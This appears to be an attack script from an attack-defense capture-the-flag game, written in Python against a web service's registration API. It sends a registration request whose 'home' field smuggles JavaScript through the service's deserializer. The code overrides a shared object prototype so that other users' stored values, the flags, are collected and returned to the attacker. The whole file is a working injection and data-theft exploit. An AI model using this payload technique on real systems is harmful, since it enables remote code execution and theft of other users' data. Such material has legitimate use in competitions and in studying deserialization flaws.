import sys
from checklib import get_initialized_session, rnd_username, rnd_password

ip = sys.argv[1]
PORT = 6091

url = f"http://{ip}:{PORT}/api"

s = get_initialized_session()
u, p = rnd_username(), rnd_password()

payload = {
    'i__type': 'c',
    'i__value': "",
    'i__class': \

"""(() => {
    Object.getPrototypeOf({}).i__serialize = function () {
        let result = {};
        let className = null;
        for (const key in this) {
            if (key === 'i__class') {
                className = this[key];
                continue;
            }
            if (this.hasOwnProperty(key)) {
                result[key] = this[key].i__serialize();
            }
        }
        if (className !== null) {
            if (className === ' models.Code') {
                if (Object.getPrototypeOf(0).leaked_flags === undefined) {
                    Object.getPrototypeOf(0).leaked_flags = [];
                }
                Object.getPrototypeOf(0).leaked_flags.push(this['home']);

                if (this['home'] === 'evilhacker') {
                    result['qr'] = Object.getPrototypeOf(0).leaked_flags.i__serialize();
                }
            }
            return {
                i__type: 'c',
                i__value: result,
                i__class: className,
            };
        }
        return {
            i__type: 'o',
            i__value: result
        };
    };
    return models.User;
})();"""
}

s.post(f"{url}/register/", json={
    'username': u,
    'password': p,
    'home': payload,
})

s.post(f"{url}/login/", json={
    'username': u,
    'password': p,
})
